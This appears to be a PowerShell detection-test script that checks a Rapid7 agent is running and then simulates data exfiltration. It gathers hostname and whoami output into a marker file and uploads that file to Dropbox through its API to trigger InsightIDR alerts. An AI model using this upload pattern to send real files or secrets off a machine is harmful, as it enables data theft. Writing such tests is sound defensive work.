# Dropbox test on Windows
# Tim H 2023

# view if Rapid7 agent is running - must be run in Powershell:
Get-Service -Name ir_agent
# The command above should return:
# Status   Name               DisplayName
# ------   ----               -----------
# Running  ir_agent           Rapid7 Insight Agent

# view the current timestamp on the Workstation/server.
# date

# This DNS lookup should trigger an Alert in InsightIDR
# visit the *Alerts* tab in InsightIDR
nslookup content.dropboxapi.com

###############################################################################
#   accessing dropbox via its API
###############################################################################
$token = 'REPLACEME'

###############################################################################
# Basic authentication, verify bearer token is valid
###############################################################################
$header = @{
    'Authorization' = "Bearer $token"
}
# $uri = "https://api.dropboxapi.com/2/users/get_current_account"
$postParams = "null"
Invoke-RestMethod -ContentType "application/json"  -Method POST -Headers $header -Uri "https://api.dropboxapi.com/2/users/get_current_account" -Body $postParams

###############################################################################
# list the files in the root folder
###############################################################################
# https://www.dropbox.com/developers/documentation/http/documentation#files-list_folder
$postParams = @{
    path = ""    
}
Invoke-RestMethod -ContentType "application/json"  -Method POST -Headers $header -Uri "https://api.dropboxapi.com/2/files/list_folder" -Body ($postParams|ConvertTo-Json) | ConvertTo-Json -Depth 10


###############################################################################
# Create a unique exportable file that doesn't have any sensitive info:
###############################################################################
$NOW = Get-Date -format "yyyy-MM-dd_HH_mm_ss"
$UNIQUE_UPLOAD_FILENAME="example_exfilration_data_${NOW}.txt"
&{
    echo $NOW
    [Environment]::OSVersion
    hostname
    whoami
 } 3>&1 2>&1 > $HOME\$UNIQUE_UPLOAD_FILENAME
# cat $HOME\$UNIQUE_UPLOAD_FILENAME


###############################################################################
# upload a file
###############################################################################
# file upload
$file_to_upload="$HOME\$UNIQUE_UPLOAD_FILENAME"

# ls $file_to_upload
$extra_dropbox_header = @"
{"autorename": false, "mode": "add", "mute": false, "path": "/$UNIQUE_UPLOAD_FILENAME", "strict_conflict": false}
"@
$header = @{
    'Authorization' = "Bearer $token"
    'Dropbox-API-Arg' = $extra_dropbox_header
}
# echo $header | ConvertTo-Json -Depth 10
Invoke-WebRequest -ContentType 'application/octet-stream' -Method POST -Headers $header -uri 'https://content.dropboxapi.com/2/files/upload' -Infile $file_to_upload
